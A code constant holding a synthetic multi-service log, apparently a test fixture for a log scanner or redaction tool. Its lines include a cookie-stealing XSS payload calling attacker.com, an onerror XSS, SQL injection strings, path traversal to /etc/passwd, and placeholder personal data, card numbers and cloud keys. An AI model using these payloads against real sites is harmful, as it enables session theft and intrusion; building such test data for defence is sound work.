export const SAMPLE_LOG_FILE = `2026-10-29T10:14:02.104Z [INFO]  [nginx-access] 192.168.1.105 - - [29/Oct/2026:10:14:02 +0000] "GET /api/v1/health HTTP/1.1" 200 48 "-" "kube-probe/1.28"
2026-10-29T10:14:15.220Z [WARN]  [auth-svc] Failed password for root from 10.0.4.15 port 44230 ssh2
2026-10-29T10:14:16.891Z [WARN]  [auth-svc] Failed password for admin from 10.0.4.15 port 44234 ssh2
2026-10-29T10:14:18.005Z [ALERT] [auth-svc] failed login attempt detected: user='dev_ops' target='prod-bastion'
2026-10-29T10:14:23.412Z [INFO]  [gateway] User session established for john.doe@company.org from client IP 203.0.113.195
2026-10-29T10:14:31.948Z [WARN]  [customer-api] KYC document verification payload submitted: pan=ABCDE1234F mobile=+91 9876543210
2026-10-29T10:14:45.310Z [CRIT]  [waf-telemetry] Inbound HTTP POST /search payload blocked: "q=' OR 1=1; --" client=198.51.100.42
2026-10-29T10:15:02.012Z [INFO]  [billing-svc] Processing checkout session for user_id=8841 card=4111-2222-3333-4444 exp=11/28
2026-10-29T10:15:19.499Z [ALERT] [web-app] Reflective parameter contains payload: <script>document.location='http://attacker.com/leak?cookie='+document.cookie</script>
2026-10-29T10:15:22.108Z [ALERT] [web-app] Malicious input rejected in user bio: <img src="x" onerror=alert(1)>
2026-10-29T10:15:40.771Z [CRIT]  [storage-proxy] Suspicious file access attempt: GET /static/../../etc/passwd HTTP/1.1 status=403
2026-10-29T10:15:44.200Z [CRIT]  [storage-proxy] Windows traversal attempt: GET /download?file=..\\..\\windows\\system32\\cmd.exe status=403
2026-10-29T10:16:01.884Z [INFO]  [notification] Dispatching OTP SMS to alternate phone 8765432109 for employee backup
2026-10-29T10:16:15.540Z [CRIT]  [env-audit] Leaked environment credential found in debug log: AWS_KEY=AKIAIOSFODNN7EXAMPLE
2026-10-29T10:16:22.019Z [CRIT]  [git-sync] CI runner logged GitHub personal token: ghp_111122223333444455556666777788889999
2026-10-29T10:16:38.125Z [WARN]  [waf-telemetry] SQL injection attempt: "SELECT * FROM users WHERE id=1 UNION SELECT null, username, password FROM admin_users"
2026-10-29T10:17:01.300Z [INFO]  [payment-gateway] Transaction completed successfully for ref_id=tx_998412
2026-10-29T10:17:15.820Z [INFO]  [system-monitor] CPU load 18%, memory usage 42%, healthy network sockets 144
`;
